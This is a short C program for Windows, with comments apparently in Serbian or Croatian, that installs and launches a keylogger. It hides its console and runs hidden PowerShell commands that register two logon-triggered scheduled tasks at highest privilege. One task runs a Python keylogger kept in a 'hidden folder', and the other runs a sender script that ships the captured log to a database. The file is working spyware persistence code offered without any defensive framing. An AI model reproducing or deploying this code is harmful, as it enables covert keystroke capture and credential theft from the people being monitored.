#include <windows.h>

int main() {
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    
    //Kreiranje taska za pokretanje keyloggera
    ShellExecute(NULL, "open", "powershell.exe", 
                 "-Command \"if (Get-ScheduledTask -TaskName 'KeyloggerTask' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -command python.exe \"C:\\skriveni_folder\\Keylogger.pyw\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries:$true -DontStopIfGoingOnBatteries:$true; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName 'KeyloggerTask' -InputObject $task }\"", 
                 NULL, SW_HIDE);
    
	system("cmd /c pythonw c:\\skriveni_folder\\Keylogger.pyw");
                 
    //Kreiranje taska za slanje log filea u DB
	ShellExecute(NULL, "open", "powershell.exe", 
                 "-Command \"if (Get-ScheduledTask -TaskName 'KeylogSender' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $taskName = 'KeylogSender'; $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -command python.exe \"C:\\skriveni_folder\\sender.pyw\"'; $triggerLogon = New-ScheduledTaskTrigger -AtLogOn; $username = whoami; $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden; $task = New-ScheduledTask -Action $taskAction -Trigger $triggerLogon -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName $taskName -InputObject $task;}\"", 
                 NULL, SW_HIDE);
    return 0;
}
